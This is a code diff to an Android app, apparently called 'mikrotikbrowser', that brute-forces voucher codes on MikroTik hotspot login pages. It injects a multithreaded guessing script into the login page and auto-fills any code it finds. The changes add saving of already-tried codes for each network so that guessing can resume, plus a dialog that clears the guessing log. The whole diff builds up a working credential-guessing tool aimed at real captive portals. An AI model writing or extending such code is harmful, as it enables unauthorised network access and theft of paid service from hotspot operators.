@@ -2,6 +2,7 @@ package com.example.mikrotikbrowser;
 
 import android.annotation.SuppressLint;
 import android.app.Activity;
+import android.app.AlertDialog;
 import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.os.Handler;
@@ -11,6 +12,9 @@ import android.webkit.*;
 import android.widget.*;
 import java.io.InputStream;
 import java.nio.charset.StandardCharsets;
+import java.util.HashSet;
+import java.util.Set;
+import java.net.URI;
 
 public class MainActivity extends Activity {
     private WebView webView;
@@ -26,6 +30,7 @@ public class MainActivity extends Activity {
     private StringBuilder logBuf = new StringBuilder();
     private Handler uiHandler = new Handler(Looper.getMainLooper());
     private boolean logUpdatePending = false;
+    private String currentNetwork = "default";
 
     @SuppressLint("SetJavaScriptEnabled")
     @Override protected void onCreate(Bundle savedInstanceState) {
@@ -101,6 +106,7 @@ public class MainActivity extends Activity {
 
         findViewById(R.id.btnStart).setOnClickListener(v -> startFinder());
         findViewById(R.id.btnStop).setOnClickListener(v -> stopFinder());
+        findViewById(R.id.btnClear).setOnClickListener(v -> clearProgress());
 
         webView.loadUrl("http://connectivitycheck.gstatic.com/generate_204");
     }
@@ -112,6 +118,21 @@ public class MainActivity extends Activity {
         webView.loadUrl(u);
     }
 
+    private void clearProgress() {
+        new AlertDialog.Builder(this)
+            .setTitle("مسح سجل التخمين")
+            .setMessage("هل أنت متأكد من مسح جميع الأرقام التي تم تخمينها لهذه الشبكة؟")
+            .setPositiveButton("نعم", (d, w) -> {
+                Set<String> empty = new HashSet<>();
+                prefs.edit().putStringSet("tried_" + currentNetwork, empty).apply();
+                logBuf.setLength(0);
+                logText.setText("🗑️ تم مسح سجل التخمين بنجاح.\n");
+                Toast.makeText(this, "تم المسح", Toast.LENGTH_SHORT).show();
+            })
+            .setNegativeButton("إلغاء", null)
+            .show();
+    }
+
     private void startFinder() {
         String url = webView.getUrl();
         if (url == null || !url.contains("/")) {
@@ -119,6 +140,11 @@ public class MainActivity extends Activity {
             return;
         }
         if (!url.contains("/login")) url = url.replaceAll("/+$", "") + "/login";
+
+        try {
+            currentNetwork = new URI(url).getHost();
+            if (currentNetwork == null) currentNetwork = "default";
+        } catch (Exception e) { currentNetwork = "default"; }
 
         String prefix = etPrefix.getText().toString().trim();
         String suffix = etSuffix.getText().toString().trim();
@@ -139,6 +165,16 @@ public class MainActivity extends Activity {
             .putString("threads", String.valueOf(threads))
             .apply();
 
+        Set<String> triedSet = prefs.getStringSet("tried_" + currentNetwork, new HashSet<>());
+        StringBuilder triedJson = new StringBuilder("[");
+        int c = 0;
+        for (String t : triedSet) {
+            if (c > 0) triedJson.append(",");
+            triedJson.append("\"").append(t).append("\"");
+            c++;
+        }
+        triedJson.append("]");
+
         logBuf.setLength(0);
         logText.setText("");
         voucherResult.setVisibility(View.GONE);
@@ -153,7 +189,8 @@ public class MainActivity extends Activity {
             + "pause:" + pause + ","
             + "retryDelay:" + retry + ","
             + "statusEvery:" + statusEvery + ","
-            + "threads:" + threads + "};";
+            + "threads:" + threads + ","
+            + "tried:" + triedJson.toString() + "};";
         webView.evaluateJavascript(cfg, null);
         webView.evaluateJavascript(finderJs, null);
     }
@@ -170,7 +207,7 @@ public class MainActivity extends Activity {
 
     private void appendLog(String msg) {
         logBuf.append(msg).append('\n');
-        if (logBuf.length() > 20000) logBuf.delete(0, 15000); // الحفاظ على حجم السجل
+        if (logBuf.length() > 20000) logBuf.delete(0, 15000);
         
         if (!logUpdatePending) {
             logUpdatePending = true;
@@ -178,13 +215,18 @@ public class MainActivity extends Activity {
                 logText.setText(logBuf.toString());
                 logScroll.post(() -> logScroll.fullScroll(ScrollView.FOCUS_DOWN));
                 logUpdatePending = false;
-            }, 100); // تحديث الواجهة كل 100 مللي ثانية فقط لتجنب التهنيج
+            }, 100);
         }
     }
 
     public class Bridge {
         @JavascriptInterface public void log(String m) {
             runOnUiThread(() -> appendLog(m));
+        }
+        @JavascriptInterface public void saveTried(String v) {
+            Set<String> triedSet = new HashSet<>(prefs.getStringSet("tried_" + currentNetwork, new HashSet<>()));
+            triedSet.add(v);
+            prefs.edit().putStringSet("tried_" + currentNetwork, triedSet).apply();
         }
         @JavascriptInterface public void progress(int c, int t, String v) {
             runOnUiThread(() -> statusText.setText("[" + c + "/" + t + "] " + v));
@@ -199,7 +241,6 @@ public class MainActivity extends Activity {
                 statusText.setText("✅ وجد: " + v);
                 Toast.makeText(MainActivity.this, "✅ " + v, Toast.LENGTH_LONG).show();
                 
-                // إرسال الكرت إلى صفحة الويب لملء الحقل وحفظه في السجل
                 String js = "javascript:(function() {" +
                     "var inputs = document.querySelectorAll('input');" +
                     "var found = false;" +
@@ -219,8 +260,6 @@ public class MainActivity extends Activity {
                     "}" +
                     "})()";
                 webView.evaluateJavascript(js, null);
-                
-                // إعادة تحميل الصفحة بعد 3 ثوانٍ فقط إذا لم يتم الضغط على زر الدخول
                 webView.postDelayed(() -> webView.reload(), 4000);
             });
         }
